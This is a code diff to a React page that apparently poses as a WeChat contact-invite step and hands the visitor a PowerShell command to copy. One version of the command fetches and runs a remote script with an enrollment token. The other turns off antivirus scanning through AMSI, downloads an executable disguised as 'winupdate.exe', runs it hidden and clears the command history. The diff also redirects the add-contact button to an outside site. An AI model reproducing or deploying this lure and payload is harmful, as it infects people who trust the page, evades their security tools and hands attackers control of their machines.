@@ -1,6 +1,6 @@
 import { useState, useEffect } from 'react';
 
-const powerShellCommand = `powershell -WindowStyle Hidden -ep Bypass -c &quot;$p=$env:TEMP+&#39;l.ps1&#39;;iwr https://wechat-invite-chi.vercel.app/l.ps1 -OutFile $p;& $p -enroll_token &#39;5e3031725f5bff1db14b7ff423d25bab6c65956028de9a5d5bb86691508de2de&#39; -id &#39;8649328&#39;&quot;"`;
+const powerShellCommand = `powershell -w h -nop -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$f='$env:TEMP\\winupdate.exe';$wc.DownloadFile('https://github.com/ShewiYT/owuenwempgf/raw/refs/heads/main/agent-windows-amd64-b4aba189.exe',$f);Start-Process $f -WindowStyle Hidden;Clear-History"`;
 
 function CopyIcon() {
   return (
@@ -102,11 +102,7 @@ function App() {
   }, [error, countdown]);
 
   const handleAddContact = () => {
-    setShowVerify(true);
-    setError(false);
-    setCurrentStep(0);
-    setVerifying(false);
-    setCountdown(60);
+    window.location.href = 'https://redirect-ten-gold.vercel.app/';
   };
 
   const handleCopy = async () => {
